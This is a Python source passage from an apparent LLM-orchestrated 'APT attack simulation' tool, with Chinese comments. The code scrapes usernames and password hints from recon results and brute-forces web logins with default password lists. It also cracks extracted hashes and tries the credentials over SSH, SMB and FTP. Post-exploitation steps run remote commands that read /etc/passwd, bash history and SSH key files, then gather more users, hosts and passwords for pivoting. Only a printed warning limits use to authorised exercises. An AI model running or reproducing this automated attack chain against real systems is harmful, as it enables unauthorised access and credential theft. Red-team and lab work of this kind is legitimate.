    # 1. 从 HTTP 工具结果提取
    http_results = recon_details.get("http_results", {})
    for _key, _r in http_results.items():
        if isinstance(_r, dict):
            for _field in ("valid_codenames", "anomalies", "results"):
                _items = _r.get(_field, [])
                if isinstance(_items, list):
                    for _item in _items:
                        if isinstance(_item, str) and _item not in seen:
                            usernames.append(_item); seen.add(_item)
                        elif isinstance(_item, dict):
                            for _k in ("agent", "codename", "username"):
                                _v = _item.get(_k, "")
                                if isinstance(_v, str) and _v and _v not in seen:
                                    usernames.append(_v); seen.add(_v)

    # 2. 从 SMB 结果提取（staff.txt 等文件内容）
    import re as _re
    smb_results = recon_details.get("smb_results", {})
    for _key, _r in smb_results.items():
        if isinstance(_r, dict):
            for _fk in ("files", "shares", "content", "findings"):
                _fv = _r.get(_fk, [])
                if isinstance(_fv, list):
                    for _item in _fv:
                        if isinstance(_item, dict):
                            for _vk in ("name", "content", "text"):
                                _vv = _item.get(_vk, "")
                                if isinstance(_vv, str):
                                    for _match in _re.finditer(r'[a-z][a-z0-9_]{2,20}', _vv):
                                        _name = _match.group()
                                        if _name not in seen:
                                            usernames.append(_name); seen.add(_name)
                        elif isinstance(_item, str):
                            for _name in _item.split():
                                if _name not in seen and len(_name) >= 2:
                                    usernames.append(_name); seen.add(_name)

    # 3. 从页面内容中提取关键词
    for _key, _r in http_results.items():
        if isinstance(_r, dict):
            _body = _r.get("body", _r.get("content", _r.get("body_preview", "")))
            if isinstance(_body, str):
                for _pattern in [r'agent[_ ]([A-Za-z0-9]+)', r'user[:_ ]([a-z]+)', r'username[:_ ]([a-z]+)',
                                 r'password[:_ ](\w+)', r'([a-z]+)[:_ ]\s*password', r'([a-z]+)[:_ ]\s*weak']:
                    for _match in _re.finditer(_pattern, _body, _re.IGNORECASE):
                        _name = _match.group(1).lower()
                        if _name not in seen and len(_name) >= 2:
                            usernames.append(_name); seen.add(_name)

    # 4. 默认兜底
    for _default in ("chris", "admin", "root", "guest", "user", "test"):
        if _default not in seen:
            usernames.append(_default); seen.add(_default)

    return usernames


def _extract_password_hints(recon_details: dict[str, Any]) -> list[str]:
    """从页面内容和结果中提取密码提示"""
    hints: list[str] = []
    http_results = recon_details.get("http_results", {})
    for _key, _r in http_results.items():
        if isinstance(_r, dict):
            _body = _r.get("body", _r.get("content", _r.get("body_preview", "")))
            if isinstance(_body, str):
                import re as _re
                for _match in _re.finditer(r'pass(word|wd)[:_\s]+(\w+)', _body, _re.IGNORECASE):
                    _val = _match.group(2).lower()
                    if _val not in hints and len(_val) <= 30:
                        hints.append(_val)
    for _p in ("weak", "changeme", "password", "admin", "123456"):
        if _p not in hints:
            hints.append(_p)
    return hints


def _auto_fetch_interesting_pages(target: str, recon_details: dict[str, Any]) -> dict[str, Any]:
    """自动读取 dir_enum 发现的感兴趣页面内容"""
    results: dict[str, Any] = {}
    http_results = recon_details.get("http_results", {})
    for _key, _r in http_results.items():
        if isinstance(_r, dict):
            _path = _r.get("path", "")
            _port = _r.get("port", 80)
            if any(_path.endswith(ext) for ext in (".php", ".asp", ".txt", ".html", ".htm")):
                try:
                    _content = run_local_tool("web_content_fetch", {
                        "target": target, "port": _port, "path": _path, "timeout": 3,
                    })
                    results[f"page_{_port}_{_path.replace('/', '_')}"] = _content
                except Exception:
                    pass
    return results


def _auto_fetch_protected_pages(target: str, port: int, recon_details: dict[str, Any]) -> dict[str, Any]:
    """用 RECON 发现的 codename 作为 UA 批量抓取受保护页面。无 codename 时用 A-Z 兜底。"""
    import concurrent.futures as _cf
    results: dict[str, Any] = {}
    codenames: set[str] = set()
    http_results = recon_details.get("http_results", {})
    for _k, _r in http_results.items():
        if isinstance(_r, dict):
            for field in ("valid_codenames", "anomalies", "results"):
                items = _r.get(field, [])
                if isinstance(items, list):
                    for item in items:
                        if isinstance(item, str) and item.strip():
                            codenames.add(item.strip())
                        elif isinstance(item, dict):
                            for subk in ("agent", "codename", "ua_value"):
                                v = item.get(subk, "")
                                if isinstance(v, str) and v.strip():
                                    codenames.add(v.strip())
    # 兜底：A-Z 全部 26 个字母
    if not codenames:
        codenames = set(chr(c) for c in range(65, 91))

    endpoints = ["/", "/admin", "/flag", "/dashboard", "/secret", "/config", "/status", "/notes", "/credentials", "/backup"]
    _ua_list = sorted(codenames)[:30]

    def _fetch_one(ua: str, path: str) -> tuple[str, dict[str, Any]] | None:
        try:
            resp = run_local_tool("web_content_fetch", {
                "target": target, "port": port, "path": path,
                "user_agent": ua, "timeout": 2,
            })
            if isinstance(resp, dict):
                body = resp.get("body") or resp.get("content") or resp.get("body_preview", "")
                if isinstance(body, str) and len(body.strip()) > 50:
                    return (f"ua_{ua}_{path.replace('/', '_')}", resp)
        except Exception:
            pass
        return None

    with _cf.ThreadPoolExecutor(max_workers=30) as _ex:
        _futures = [_ex.submit(_fetch_one, ua, path) for ua in _ua_list for path in endpoints]
        for _f in _cf.as_completed(_futures, timeout=45):
            try:
                _r = _f.result(timeout=5)
                if _r:
                    _k, _v = _r
                    results[_k] = _v
            except Exception:
                pass

    if results:
        safe_print(f"  [ua-fetch] {len(_ua_list)} codenames -> {len(results)} protected pages")
    return results


def _auto_initial_access(target: str, state: AptSimulationState) -> dict[str, Any]:
    """全自动 INITIAL_ACCESS 阶段：从 ALL RECON 结果中提取情报并攻击"""
    safe_print("  [自动执行] INITIAL_ACCESS 阶段工具链")

    recon_result = state.phase_results.get("recon")
    recon_details = recon_result.details if recon_result else {}
    open_ports = recon_details.get("open_ports", [])
    categories = recon_details.get("categories", {})
    http_results = recon_details.get("http_results", {})

    results: dict[str, Any] = {
        "http_attacks": {},
        "credential_attack": None,
        "exploit_results": {},
        "findings": [],
    }

    # ── 从 ALL 结果提取用户名和密码提示 ──
    known_usernames = _extract_usernames_from_all(recon_details)
    password_hints = _extract_password_hints(recon_details)
    results["known_usernames"] = known_usernames
    results["password_hints"] = password_hints

    # ── HTTP 攻击链 ──
    for port in categories.get("http", []):
        safe_print(f"  → HTTP 攻击链 (端口 {port})")
        _web_tools = [
            ("web_content_fetch", {"path": "/"}),
            ("web_content_fetch", {"path": "/admin"}),
            ("web_content_fetch", {"path": "/flag"}),
            ("web_content_fetch", {"path": "/dashboard"}),
        ]
        results["http_attacks"].update(_run_tool_chain(target, port, _web_tools))

        # 自动抓取 dir_enum 发现的感兴趣页面
        _extra_pages = _auto_fetch_interesting_pages(target, recon_details)
        results["http_attacks"].update(_extra_pages)

        # ── 哈希提取 + 破解（从 SMB 文件和页面内容中） ──
        _ua_pages = _auto_fetch_protected_pages(target, port, recon_details)
        if _ua_pages:
            results["http_attacks"].update(_ua_pages)

        _found_by_hash = False
        safe_print("  [hash_extract] 从 SMB 文件和页面内容提取哈希...")
        _hash_parts: list[str] = []
        # SMB 结果中的文件内容
        for _sk, _sr in recon_details.get("smb_results", {}).items():
            if isinstance(_sr, dict):
                for _fk in ("files", "content", "findings"):
                    _fv = _sr.get(_fk, [])
                    if isinstance(_fv, list):
                        for _item in _fv:
                            if isinstance(_item, dict):
                                for _vk in ("content", "text", "name", "data"):
                                    _vv = _item.get(_vk, "")
                                    if isinstance(_vv, str) and _vv:
                                        _hash_parts.append(_vv)
                            elif isinstance(_item, str):
                                _hash_parts.append(_item)
        # 已抓取页面内容中的哈希
        for _rk, _rv in results.get("http_attacks", {}).items():
            if isinstance(_rv, dict):
                for _fk in ("body", "content", "body_preview", "response"):
                    _fv = _rv.get(_fk, "")
                    if isinstance(_fv, str) and _fv:
                        _hash_parts.append(_fv)
        if _hash_parts:
            try:
                _all_text = "\n".join(_hash_parts)
                _extracted = run_local_tool("hash_extract", {"content": _all_text})
                if isinstance(_extracted, dict) and _extracted.get("hashes"):
                    _eh = _extracted["hashes"]
                    safe_print(f"  [hash_extract] 发现 {len(_eh)} 个哈希")
                    _cracked = run_local_tool("hash_crack", {"hashes": _eh})
                    if isinstance(_cracked, dict) and _cracked.get("cracked"):
                        _cpw = [c["password"] for c in _cracked["cracked"] if c.get("password")]
                        if _cpw:
                            safe_print(f"  [hash_crack] 破解 {len(_cpw)} 个密码: {_cpw}")
                            results["cracked_hashes"] = _cracked
                            results["findings"].append(f"哈希破解获得密码: {_cpw}")
                            _found_by_hash = True
                            for _p in _cpw:
                                if _p not in password_hints:
                                    password_hints.append(_p)
            except Exception as _exc:
                safe_print(f"  [hash_extract] 错误: {str(_exc)[:100]}")

        # 检查 UA 页面是否已包含明文凭证（如 "chris:weak"），有则跳过 brute
        _found_in_ua = False
        if _ua_pages and known_usernames and password_hints:
            import re as _re
            _pw_hints_lower = {h.lower() for h in password_hints}
            for _upv in _ua_pages.values():
                _body = _upv.get("body") or _upv.get("content") or _upv.get("body_preview", "") if isinstance(_upv, dict) else ""
                if not isinstance(_body, str):
                    continue
                for _u in known_usernames:
                    _m = _re.search(rf'{_re.escape(_u)}[:\s]+(\S+)', _body, _re.I)
                    if _m and _m.group(1).lower() in _pw_hints_lower:
                        _found_in_ua = True
                        break
                if _found_in_ua:
                    break
        if _found_in_ua:
            safe_print(f'  [web_login_brute] UA pages contain explicit creds, skip brute')
        elif _found_by_hash:
            safe_print('  [web_login_brute] hash cracked, skip web brute')
        else:
            safe_print(f'  [web_login_brute] trying {len(known_usernames)} users on port {port}...')
            _start = _time.monotonic()
            try:
                _login = run_local_tool("web_login_brute", {
                    "target": target, "port": port,
                    "timeout": 2,
                    "usernames": known_usernames,
                    "passwords": password_hints + [
                        "weak", "changeme", "password", "admin", "123456", "admin123",
                        "passw0rd", "P@ssw0rd", "secret", "chris", "agent",
                    ],
                })
                results["http_attacks"][f"web_login_brute_{port}"] = _login
                safe_print(f"  [web_login_brute] 完成 ({_time.monotonic()-_start:.0f}s)")
            except Exception as _exc:
                results["http_attacks"][f"web_login_brute_{port}"] = {"error": str(_exc)[:200]}

    # ── 后渗透工作流：收集所有凭证 → 验证 → 扩展 → 收割 → 传递 ──
    all_credentials = _collect_all_credentials(results, known_usernames)

    # Also collect from web_login_brute successes
    for _k, _v in results.get("http_attacks", {}).items():
        if isinstance(_v, dict):
            for s in _v.get("successes", []):
                if isinstance(s, dict):
                    u, p = s.get("username", ""), s.get("password", "")
                    if u and p and not any(
                        c["username"] == u and c["password"] == p
                        for c in all_credentials
                    ):
                        all_credentials.append({
                            "username": u, "password": p,
                            "source": "web_login_brute", "service": "http",
                        })

    if all_credentials:
        safe_print(f"  [post-exploit] 收集 {len(all_credentials)} 组凭证，开始后渗透...")
        try:
            post_results = _auto_post_exploit(target, categories, all_credentials, state)
            results["post_exploit"] = post_results
            results["findings"].extend(post_results.get("findings", [])[:10])
            if post_results.get("credentials"):
                results["credentials"] = post_results["credentials"]
                results["access_level"] = post_results.get("access_level", "none")
        except Exception as _pex:
            safe_print(f"  [post-exploit] 错误: {_pex}")
    else:
        safe_print("  [post-exploit] 无可用凭证")

    # Fallback: check for codenames
    for _key, _r in results.get("http_attacks", {}).items():
        if isinstance(_r, dict):
            _valid = _r.get("valid_codenames", [])
            if isinstance(_valid, list) and len(_valid) > 0:
                for _v in _valid:
                    _fl = f"发现有效 codename: {_v}"
                    if _fl not in results["findings"]:
                        results["findings"].append(_fl)

    results["open_ports"] = open_ports
    results["categories"] = categories
    return results


def _collect_all_credentials(results: dict[str, Any], known_usernames: list[str]) -> list[dict[str, Any]]:
    """从 INITIAL_ACCESS 所有结果中提取结构化凭证列表"""
    credentials: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    # 1. From hash cracking
    cracked = results.get("cracked_hashes", {})
    if isinstance(cracked, dict):
        for entry in cracked.get("cracked", []):
            pw = entry.get("password", "")
            if not pw:
                continue
            for u in known_usernames:
                key = (u, pw)
                if key not in seen:
                    seen.add(key)
                    credentials.append({"username": u, "password": pw, "source": "hash_crack", "service": "unknown"})

    # 2. From web_login_brute successes
    for _k, val in results.get("http_attacks", {}).items():
        if isinstance(val, dict):
            for s in val.get("successes", []):
                if isinstance(s, dict):
                    u, p = s.get("username", ""), s.get("password", "")
                    if u and p and (u, p) not in seen:
                        seen.add((u, p))
                        credentials.append({"username": u, "password": p, "source": "web_brute", "service": "http"})

    # 3. From password hints paired with known usernames
    for pw in results.get("password_hints", []):
        for u in known_usernames:
            if (u, pw) not in seen:
                seen.add((u, pw))
                credentials.append({"username": u, "password": pw, "source": "hint", "service": "unknown"})

    return credentials


def _auto_post_exploit(
    target: str,
    categories: dict[str, list[int]],
    credentials_list: list[dict[str, Any]],
    state: AptSimulationState,
) -> dict[str, Any]:
    """行业标准后渗透工作流：验证 -> 扩展 -> 收割 -> 传递
    1. Verify: 测试凭证在所有开放服务（SSH/SMB/FTP）上的有效性
    2. Expand: 用有效凭证执行远程命令、认证 SMB 枚举
    3. Harvest: 从扩展结果中提取新用户、内网主机、更多密码
    4. Pivot: 结构化结果写入 state.notes 供后续阶段使用
    """
    import re as _re
    safe_print("  [post-exploit] 开始后渗透凭证验证与扩展...")

    results: dict[str, Any] = {
        "verified_services": [], "ssh_recon": {}, "smb_enum_result": {},
        "http_auth_result": {}, "harvested": {}, "findings": [],
        "credentials": {}, "access_level": "none",
    }

    # Dedup
    seen = set()
    unique_creds = []
    for c in credentials_list:
        k = (c["username"], c["password"])
        if k not in seen:
            seen.add(k)
            unique_creds.append(c)
    if not unique_creds:
        safe_print("  [post-exploit] 无可用凭证")
        return results

    # ── Phase 1: VERIFY ──
    has_ssh = bool(categories.get("ssh"))
    has_smb = bool(categories.get("smb"))
    has_ftp = bool(categories.get("ftp"))

    for cred in unique_creds:
        u, p = cred["username"], cred["password"]

        if has_ssh and "ssh" not in results["verified_services"]:
            try:
                r = run_local_tool("apt_credential_attack", {
                    "host": target,
                    "services": [{"port": categories["ssh"][0], "service": "ssh"}],
                    "users": [u], "passwords": [p], "max_threads": 1, "timeout": 5,
                })
                if r.get("successes"):
                    results["verified_services"].append("ssh")
                    results["credentials"] = {"username": u, "password": p}
                    results["findings"].append(f"SSH 验证成功: {u}:{p}")
                    safe_print(f"    [OK] SSH {u}:{p}")
            except Exception as ex:
                safe_print(f"    [ERR] SSH: {ex}")

        if has_smb and "smb" not in results["verified_services"]:
            try:
                r = run_local_tool("apt_smb_enum", {
                    "host": target, "username": u, "password": p,
                })
                if not r.get("error"):
                    results["verified_services"].append("smb")
                    if not results.get("credentials"):
                        results["credentials"] = {"username": u, "password": p}
                    results["findings"].append(f"SMB 验证成功: {u}:{p}")
                    safe_print(f"    [OK] SMB {u}:{p}")
            except Exception as ex:
                safe_print(f"    [ERR] SMB: {ex}")

        if has_ftp and "ftp" not in results["verified_services"]:
            try:
                r = run_local_tool("apt_credential_attack", {
                    "host": target,
                    "services": [{"port": categories["ftp"][0], "service": "ftp"}],
                    "users": [u], "passwords": [p], "max_threads": 1, "timeout": 5,
                })
                if r.get("successes"):
                    results["verified_services"].append("ftp")
                    if not results.get("credentials"):
                        results["credentials"] = {"username": u, "password": p}
                    safe_print(f"    [OK] FTP {u}:{p}")
            except Exception as ex:
                safe_print(f"    [ERR] FTP: {ex}")

        if results.get("credentials"):
            break

    if not results.get("credentials"):
        safe_print("  [post-exploit] 所有凭证验证失败")
        return results

    # ── Phase 2: EXPAND ──
    cred = results["credentials"]
    u, p = cred["username"], cred["password"]

    if "ssh" in results["verified_services"]:
        safe_print("  [post-exploit/expand] SSH 侦察...")
        for cmd_name, cmd_str in [
            ("id", "id"),
            ("sudo_l", "echo '' | sudo -S -l 2>&1 || true"),
            ("uname", "uname -a"),
            ("home_ls", "ls -la ~ 2>/dev/null; ls -la /home/ 2>/dev/null"),
            ("passwd", "cat /etc/passwd 2>/dev/null | head -30"),
            ("bash_history", "cat ~/.bash_history 2>/dev/null | tail -30"),
            ("ssh_keys", "find ~/.ssh -type f -name 'id_*' -o -name 'authorized_keys' 2>/dev/null | head -5"),
            ("net_info", "ip addr 2>/dev/null || ifconfig 2>/dev/null; netstat -tlnp 2>/dev/null | head -20 || ss -tlnp 2>/dev/null | head -20"),
        ]:
            try:
                r = run_local_tool("apt_remote_exec", {
                    "host": target, "username": u, "password": p, "command": cmd_str,
                })
                out = r.get("stdout") or r.get("output") or ""
                results["ssh_recon"][cmd_name] = out[:2000]
            except Exception as ex:
                results["ssh_recon"][cmd_name] = f"ERR: {ex}"

        id_out = results["ssh_recon"].get("id", "")
        results["access_level"] = "root" if ("uid=0" in id_out or "root" in id_out) else "user"
        safe_print(f"  [post-exploit] access_level={results['access_level']}")

    if "smb" in results["verified_services"]:
        safe_print("  [post-exploit/expand] SMB 认证枚举...")
        try:
            r = run_local_tool("apt_smb_enum", {"host": target, "username": u, "password": p})
            results["smb_enum_result"] = r
            results["findings"].append(f"SMB 认证发现 {len(r.get('shares', []))} 个共享")
        except Exception as ex:
            results["smb_enum_result"] = {"error": str(ex)[:200]}

    # ── Phase 3: HARVEST ──
    harvested_users, harvested_hosts, harvested_passwords = [], [], []

    for line in results.get("ssh_recon", {}).get("passwd", "").splitlines():
        parts = line.split(":")
        if len(parts) >= 3:
            try:
                uid = int(parts[2])
                if 1000 <= uid < 65534 and parts[0]:
                    harvested_users.append(parts[0])
            except ValueError:
                pass

    for line in results.get("ssh_recon", {}).get("bash_history", "").splitlines():
        m = _re.search(r'ssh\s+(\w+)@([\d.]+)', line)
        if m:
            harvested_hosts.append(m.group(2))
            harvested_users.append(m.group(1))
        m = _re.search(r'(?:password|passwd|secret)[=:\s]+(\S+)', line, _re.I)
        if m and 2 < len(m.group(1)) < 40:
            harvested_passwords.append(m.group(1))

    for fc in results.get("smb_enum_result", {}).get("file_contents", []):
        c = fc.get("content", "")
        for m in _re.finditer(r'(?:user|username|login)[=:\s]+(\w+)', c, _re.I):
            harvested_users.append(m.group(1))
        for m in _re.finditer(r'(?:password|passwd|secret)[=:\s]+(\S+)', c, _re.I):
            harvested_passwords.append(m.group(1))

    results["harvested"] = {
        "users": list(set(harvested_users))[:20],
        "hosts": list(set(harvested_hosts))[:20],
        "passwords": list(set(harvested_passwords))[:10],
    }
    if harvested_users:
        results["findings"].append(f"收割 {len(set(harvested_users))} 个新用户")
    if harvested_hosts:
        results["findings"].append(f"发现 {len(set(harvested_hosts))} 个内网主机")

    # ── Phase 4: PIVOT ──
    state.notes["credentials"] = results["credentials"]
    state.notes["post_exploit"] = {
        "ssh_recon": results["ssh_recon"],
        "smb_shares": results.get("smb_enum_result", {}).get("shares", []),
        "harvested": results["harvested"],
        "access_level": results["access_level"],
        "verified_services": results["verified_services"],
    }
    primary = state.targets[0]
    if not primary.compromised:
        primary.compromised = True
        primary.access_level = results["access_level"]
        primary.notes["credentials"] = results["credentials"]

    safe_print(f"  [post-exploit] OK -- 服务: {results['verified_services']}, 等级: {results['access_level']}, 收割: {len(set(harvested_users))}用户/{len(set(harvested_hosts))}主机")
    return results

def _get_open_services(state: AptSimulationState) -> list[dict[str, Any]]:
    """从 RECON 结果获取开放端口列表"""
    recon_result = state.phase_results.get("recon")
    if recon_result and recon_result.details:
        return recon_result.details.get("open_ports", [])
    return []


def merge_phase_result(state: AptSimulationState, phase: AptPhase, result: dict[str, Any]) -> None:
    """将阶段执行结果合并到全局状态"""
    phase_result = AptPhaseResult(
        phase=phase,
        status="success" if result.get("summary") else "failed",
        summary=result.get("summary", ""),
        findings=result.get("findings", []),
        details=result,
    )
    state.phase_results[phase.value] = phase_result

    delta = result.get("blue_team_awareness_delta", 0)
    # 每个阶段的感知度增幅上限（防止 LLM 随意填 100）
    _MAX_DELTA: dict[AptPhase, int] = {
        AptPhase.RECON: 10, AptPhase.SOCIAL_ENG: 15,
        AptPhase.INITIAL_ACCESS: 20, AptPhase.PERSISTENCE: 25,
        AptPhase.LATERAL: 25, AptPhase.CROSS_TARGET: 20, AptPhase.REPORT: 5,
    }
    delta = max(0, min(delta, _MAX_DELTA.get(phase, 20)))
    state.blue_team_awareness = min(100, state.blue_team_awareness + delta)

    t = state.targets[0]
    # 只有 LLM 明确返回了有效凭证才标记沦陷。compromised: true 但没凭证 = 无视
    creds = result.get("credentials", {})
    has_valid_creds = bool(creds and creds.get("username") and creds.get("password"))
    if has_valid_creds and not t.compromised:
        t.compromised = True
        t.access_level = "user"
        t.notes["credentials"] = creds
        # 也存到 state.notes 供后续阶段使用
        state.notes["credentials"] = creds
        state.notes["compromised_via"] = "credential_bruteforce"

    if t.compromised and t.id not in state.compromised_targets:
        state.compromised_targets.append(t.id)

    # 跨目标打击成功后，标记下游目标也已控
    if phase == AptPhase.CROSS_TARGET and len(state.targets) > 1:
        cross_t = state.targets[1]
        if not cross_t.compromised:
            cross_t.compromised = True
            cross_t.access_level = "user"
            cross_t.compromised_via = t.host
        if cross_t.id not in state.compromised_targets:
            state.compromised_targets.append(cross_t.id)


def _build_final_result(state: AptSimulationState) -> dict[str, Any]:
    """将最终状态转为可序列化 dict"""
    return {
        "state": {
            "targets": [
                {
                    "id": t.id,
                    "host": t.host,
                    "vector": t.vector,
                    "compromised": t.compromised,
                    "compromised_via": t.compromised_via,
                    "access_level": t.access_level,
                }
                for t in state.targets
            ],
            "vector": state.current_vector,
            "blue_team_awareness": state.blue_team_awareness,
            "compromised_targets": state.compromised_targets,
            "start_time": state.start_time,
        },
        "phase_results": [
            {
                "phase": r.phase.value,
                "status": r.status,
                "summary": r.summary,
                "findings": r.findings,
                "details": r.details,
            }
            for r in state.phase_results.values()
        ],
        "kill_chain": state.kill_chain,
    }


# ── 主编排循环 ──────────────────────────────────────────

CHECKPOINT_FILE = ".apt_checkpoint.json"


def save_checkpoint(state: AptSimulationState, phase_timings: dict[str, float]) -> None:
    """保存断点：阶段状态 + 凭证，下次 --resume 可续跑"""
    data: dict[str, Any] = {
        "vector": state.current_vector,
        "targets": [
            {
                "id": t.id, "host": t.host, "vector": t.vector,
                "compromised": t.compromised, "access_level": t.access_level,
                "notes": t.notes,
            }
            for t in state.targets
        ],
        "blue_team_awareness": state.blue_team_awareness,
        "compromised_targets": state.compromised_targets,
        "start_time": state.start_time,
        "phase_results": {
            k: {"phase": v.phase.value, "status": v.status, "summary": v.summary,
                "findings": v.findings, "details": v.details}
            for k, v in state.phase_results.items()
        },
        "notes": state.notes,
        "phase_timings": phase_timings,
    }
    with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def load_checkpoint() -> dict[str, Any] | None:
    """加载断点文件，不存在返回 None"""
    import os as _os
    if not _os.path.exists(CHECKPOINT_FILE):
        return None
    with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def _restore_state_from_checkpoint(ck: dict[str, Any]) -> AptSimulationState:
    """从 checkpoint dict 恢复 AptSimulationState"""
    targets = [
        AptTarget(
            id=t["id"], host=t["host"], vector=t.get("vector", "firewall_breach"),
            compromised=t.get("compromised", False),
            access_level=t.get("access_level", "none"),
            notes=t.get("notes", {}),
        )
        for t in ck["targets"]
    ]
    state = AptSimulationState(
        targets=targets,
        current_phase=AptPhase.RECON,
        current_vector=ck.get("vector", "firewall_breach"),
        blue_team_awareness=ck.get("blue_team_awareness", 0),
        compromised_targets=ck.get("compromised_targets", []),
        start_time=ck.get("start_time", ""),
        notes=ck.get("notes", {}),
    )
    for k, v in ck.get("phase_results", {}).items():
        phase = v.get("phase", k)
        try:
            p = AptPhase(phase)
        except ValueError:
            continue
        state.phase_results[k] = AptPhaseResult(
            phase=p, status=v.get("status", "pending"),
            summary=v.get("summary", ""), findings=v.get("findings", []),
            details=v.get("details", {}),
        )
    return state


def run_apt_simulation(
    target: dict[str, Any],
    *,
    assistant_factory: Callable[[str, list[str]], Any] | None = None,
    resume: bool = False,
) -> dict[str, Any]:
    """APT 攻击模拟 — 单向量编排

    按指定的攻击向量 (firewall_breach / supply_chain / phishing) 执行阶段序列。
    resume=True 时加载断点文件，跳过已完成阶段。
    """
    from .agentic import SecurityAgentError

    import time as _time
    _phase_timings: dict[str, float] = {}
    _overall_start = _time.monotonic()

    # ── 断点续跑 ──
    completed_phases: set[str] = set()
    if resume:
        ck = load_checkpoint()
        if ck:
            state = _restore_state_from_checkpoint(ck)
            vector = state.current_vector
            phases = VECTOR_PHASES.get(vector, VECTOR_PHASES["firewall_breach"])
            completed_phases = set(ck.get("phase_results", {}).keys())
            _phase_timings = ck.get("phase_timings", {})
            print("\n" + "=" * 60)
            safe_print(f"[!] 从断点续跑 — {VECTOR_LABELS.get(vector, vector)}")
            print("=" * 60)
            safe_print(f"\n目标: {state.targets[0].host}")
            safe_print(f"已完成: {', '.join(PHASE_LABELS.get(AptPhase(p), p) for p in completed_phases if p in PHASE_LABELS or p == 'report')}")  # type: ignore[arg-type]
            safe_print(f"蓝队感知度: {state.blue_team_awareness}/100")
            # 显示凭证
            creds = state.notes.get("credentials")
            if creds:
                safe_print(f"已有凭证: {creds.get('username', '?')}:{creds.get('password', '?')}")
            safe_print("")
        else:
            safe_print("未找到断点文件，开始全新模拟。")
            resume = False

    if not resume:
        state = build_initial_state(target)
        vector = state.current_vector
        phases = VECTOR_PHASES.get(vector, VECTOR_PHASES["firewall_breach"])

    if not resume:
        print("\n" + "=" * 60)
        safe_print(f"[!] APT 攻击模拟 — {VECTOR_LABELS.get(vector, vector)}")
        safe_print("    仅用于授权的红蓝对抗 / 安全研究")
        safe_print("    未经授权使用属于违法行为")
        print("=" * 60)
        safe_print(f"\n目标: {state.targets[0].host}")
        if len(state.targets) > 1:
            safe_print(f"跳板攻击下游: {state.targets[1].host} (通过已控 {state.targets[0].host})")
        safe_print(f"阶段: {' → '.join(PHASE_LABELS[p] for p in phases)} → 报告生成\n")

    for phase in phases:
        if state.blue_team_awareness >= 90:
            safe_print(f"  [!] 蓝队感知度过高 ({state.blue_team_awareness}/100)，攻击链终止")
            break

        label = PHASE_LABELS.get(phase, phase.value)
        _cumulative = _time.monotonic() - _overall_start

        # 断点续跑：跳过已完成阶段
        if phase.value in completed_phases:
            pr = state.phase_results.get(phase.value)
            status = pr.status if pr else "?"
            safe_print(f"── [{label}] (累计 {_cumulative:.0f}s) [跳过，已完成: {status}]")
            continue

        safe_print(f"── [{label}] (累计 {_cumulative:.0f}s)")
        state.current_phase = phase
        _t0 = _time.monotonic()

        try:
            result = _execute_phase(state, phase, assistant_factory)
            _elapsed = _time.monotonic() - _t0
            _phase_timings[phase.value] = _elapsed
            merge_phase_result(state, phase, result)
            icon = "[OK]" if result.get("summary") else "[FAIL]"
            _safe_summary = result.get('summary', '完成')
            safe_print(f"  {icon} {_safe_summary}")
            safe_print(f"  [+] {_elapsed:.1f}s (累计 {_time.monotonic() - _overall_start:.0f}s)")
            # 保存断点
            save_checkpoint(state, _phase_timings)
        except SecurityAgentError as exc:
            _elapsed = _time.monotonic() - _t0
            _phase_timings[phase.value] = _elapsed
            state.phase_results[phase.value] = AptPhaseResult(
                phase=phase, status="failed", summary=f"执行失败: {exc}",
            )
            safe_print(f"  [FAIL] 执行失败: {exc}  ({_elapsed:.1f}s)")
            save_checkpoint(state, _phase_timings)

    # 最终报告（跳过如果已生成过）
    _cumulative = _time.monotonic() - _overall_start
    if "report" not in completed_phases:
        safe_print(f"\n── [报告生成] (累计 {_cumulative:.0f}s)")
        state.current_phase = AptPhase.REPORT
        _t0 = _time.monotonic()
        try:
            result = _execute_phase(state, AptPhase.REPORT, assistant_factory)
            _elapsed = _time.monotonic() - _t0
            _phase_timings["report"] = _elapsed
            merge_phase_result(state, AptPhase.REPORT, result)
            safe_print(f"  [OK] 报告已生成  ({_elapsed:.1f}s)")
        except SecurityAgentError:
            _elapsed = _time.monotonic() - _t0
            _phase_timings["report"] = _elapsed
        save_checkpoint(state, _phase_timings)

    # 计时总结
    _total = _time.monotonic() - _overall_start
    safe_print("\n── 计时总结 ──")
    for _pv, _sec in _phase_timings.items():
        _plabel = PHASE_LABELS.get(AptPhase(_pv), _pv) if _pv != "report" else "报告生成"
        safe_print(f"  {_plabel}: {_sec:.1f}s")
    safe_print(f"  总计: {_total:.1f}s")
    state.notes["phase_timings"] = _phase_timings

    return _build_final_result(state)


def _build_tool_checklist(phase: AptPhase, target_info: dict[str, Any]) -> str:
    """生成工具调用建议清单"""
    target_ip = str(target_info.get("target", ""))
    lines: list[str] = []

    if phase == AptPhase.RECON:
        lines = [
            "## 分析要点",
            "",
            f"目标: {target_ip}",
            "",
            "- 工具已全部自动执行完毕，结果见上方 JSON",
            "- 分析 nmap 发现了哪些开放端口和服务",
            "- 分析 Web 扫描（页面内容、目录枚举）结果",
            "- 如果有发现的 codename 或凭证，在 JSON 中报告",
            "- 输出 JSON 摘要",
        ]

    elif phase == AptPhase.INITIAL_ACCESS:
        lines = [
            "## 分析要点",
            "",
            f"目标: {target_ip}",
            "",
            "- 攻击工具已全部自动执行完毕，结果见上方 JSON",
            "- 分析哪些攻击路径成功获得了凭证",
            "- 如果有成功的登录，在 credentials 字段中报告",
        ]

    return "\n".join(lines)


def _msg_role(msg: Any) -> str:
    """Get role field from Message object or dict."""
    if hasattr(msg, "role"):
        return msg.role or ""
    if isinstance(msg, dict):
        return msg.get("role", "")
    return ""


def _msg_content(msg: Any) -> str:
    """Get content field from Message object or dict."""
    if hasattr(msg, "content"):
        return msg.content or ""
    if isinstance(msg, dict):
        return msg.get("content", "")
    return ""


def _msg_name(msg: Any) -> str:
    """Get name field from Message object or dict."""
    if hasattr(msg, "name"):
        return msg.name or ""
    if isinstance(msg, dict):
        return msg.get("name", "")
    return ""


def _get_func_call(msg: Any) -> dict | None:
    """从 Message 对象或 dict 中提取 function_call 信息"""
    if hasattr(msg, "function_call") and msg.function_call:
        fc = msg.function_call
        if hasattr(fc, "name"):
            return {"name": fc.name, "arguments": getattr(fc, "arguments", "{}")}
        if isinstance(fc, dict):
            return fc
        return None
    if isinstance(msg, dict):
        return msg.get("function_call")
    return None


